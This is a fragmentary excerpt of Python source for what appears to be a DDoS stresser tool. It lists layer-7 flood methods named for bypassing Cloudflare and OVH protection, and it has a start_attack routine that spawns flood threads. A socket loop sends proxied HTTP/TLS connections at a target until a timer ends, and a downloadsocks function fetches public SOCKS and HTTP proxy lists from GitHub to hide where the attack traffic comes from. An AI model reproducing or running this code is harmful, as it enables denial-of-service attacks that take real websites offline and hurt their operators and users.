...
l7 = ["CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "OSTRESS", "DYN", "SLOW", "HEAD", "HIT", "NULL", "COOKIE", "BRUST", "PPS", "EVEN", "GSB", "DGB", "AVB","CFBV2"]
...
def start_attack(method, threads, event, socks_type):
    ...
    try:
        if method == "post":
            ...
            for _ in range (threads):
                threading.Thread(target=cfbv2, args=(event, timer), daemon=True).start()
...
def ovh(event, socks_type):
    ...
    while time.time() < timer:
        try:
            ...
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, socket.TCP_DEFER_ACCEPT, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
...
def downloadsocks(choice):
    ...
    if choice == "4":
        f = open(out_file, 'wb')
        try:
            r = requests.get("https://raw.githubusercontent.com/FortniBloxYT/https-proxy/main/STRONGEST-SOCKS4.TXT",
                             timeout=5)
            f.write(r.content)
        except:
            pass
    ...
    if choice == "5":
        f = open(out_file, 'wb')
        try:
            r = requests.get("https://raw.githubusercontent.com/FortniBloxYT/https-proxy/main/FRESH-SOCKS5-PROXIES",
                             timeout=5)
            f.write(r.content)
        except:
            pass
    ...
    if choice == "1":
        f = open(out_file, 'wb')
        try:
            r = requests.get("https://raw.githubusercontent.com/FortniBloxYT/https-proxy/main/FRESH-HTTP-PROXIES",
                             timeout=5)
            f.write(r.content)
        except:
            pass
